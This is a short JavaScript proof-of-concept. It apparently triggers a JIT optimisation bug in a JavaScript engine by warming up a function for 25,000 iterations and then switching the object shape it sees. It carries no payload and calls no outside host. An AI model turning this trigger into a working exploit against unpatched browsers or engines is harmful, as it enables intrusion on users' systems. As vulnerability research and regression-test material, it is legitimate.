let trigger = false;

function poc(flag) {
    class A {
        constructor() {
            this.p0 = 1.1;
            this.p1 = 2.2;
            this.p2 = 3.3;
            this.p3 = 4.4;
        }
    }

    class B extends A {
        constructor() {
            super();
            if (trigger) {
                this.p4 = {};
            }
        }
    }

    let C = A;
    if (flag) {
        C = B;
    }

    let o = new C();

    return o.p2;
}

for (let i = 0; i < 25000; i++) {
    poc(false);
}
trigger = true;
poc(true);